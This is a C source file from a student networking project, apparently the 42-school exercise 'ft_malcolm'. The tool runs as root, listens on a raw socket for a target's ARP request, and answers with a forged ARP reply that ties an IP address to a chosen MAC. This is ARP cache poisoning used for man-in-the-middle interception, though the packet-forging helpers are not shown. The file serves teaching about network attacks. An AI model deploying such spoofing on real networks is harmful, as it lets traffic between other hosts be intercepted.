/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lle-saul <lle-saul@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/04/02 14:27:54 by lle-saul          #+#    #+#             */
/*   Updated: 2025/07/05 15:17:17 by lle-saul         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

int	g_socket;

/*arp_sha => sender MAC | arp_spa => sender ip
arp_tha => target Mac | arp_tpa => target ip*/
bool	process_pkg(char *buff, t_info *info, struct sockaddr_ll *recv_addr)
{
	struct ethhdr		*eth = (struct ethhdr *)buff;
	struct ether_arp	*arp = (struct ether_arp *)(buff + sizeof(struct ethhdr));
	(void)eth;
	
	if (!compare_mac((unsigned char *)arp->arp_sha, info->target_mac, info->target_mac_len) || !compare_ip(arp->arp_spa, &info->target_ip.sin_addr))
	return (false);

	char	sender_ip[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
	
	printf("An ARP request has been broadcast.\n");
	printf("\tmac address of request: ");
	print_mac(arp->arp_sha);
	printf("\n\tIP address of request: %s\n", sender_ip);
	
	send_pkg(create_send_pkg(info, *eth, *arp), recv_addr);
	
	printf("Exiting program...\n");
	return (true);
}

int	main(int ac, char **av)
{
	t_info	info;
	
	if (ac < 5 || ac > 7) {
		printf("use : ft_malcolm [-v] <source_ip> <source_MAC> <target_ip> <target_MAC> [interface_name]\n");
		return (1);
	}
	if (getuid() != 0) {
		fprintf(stderr, "Error: this program must be run as root.\n");
		return (1);
	}
	int	offset = check_flag(&info, av);
	if (check_ip(&info, av[1 + offset], av[3 + offset]) || check_mac(&info, av[2 + offset], av[4 + offset]) || handle_signal())
		return (1);
	g_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (g_socket < 0) {
		fprintf(stderr, "Error socket creation : %s\n", strerror(errno));
		return (1);
	}
	
	struct ifreq	ifr;
	if (get_inter(av[5 + offset], &ifr))
		return (close(g_socket), 1);
	
	while (1)
	{
		struct sockaddr_ll	recv_addr;
		socklen_t		recv_addr_len = sizeof(recv_addr);
		char			buff[BUFFER_SIZE];
		int				byte_recv = 0;
		
		while (1) {
			byte_recv = recvfrom(g_socket, buff, BUFFER_SIZE, 0, (struct sockaddr *)&recv_addr, &recv_addr_len);
			if (byte_recv < 0 || ifr.ifr_ifindex == recv_addr.sll_ifindex)
				break;
		}
		if (byte_recv < 0) {
			if (errno == EBADF)
				printf("\nProgram stopped, Good Bye !\n");
			else
				fprintf(stderr, "Error recvfrom : %s\n", strerror(errno));
			break;
		}
		
		if (process_pkg(buff, &info, &recv_addr))
			break;
	}
	close(g_socket);
}
